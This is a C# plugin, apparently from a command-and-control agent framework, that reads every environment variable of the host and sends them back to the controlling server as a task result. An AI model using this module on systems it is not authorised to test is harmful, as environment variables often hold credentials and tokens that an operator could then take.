using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "env";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            string output = JsonSerializer.Serialize(Environment.GetEnvironmentVariables());

            await messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = output,
                completed = true
            });
        }
    }
}
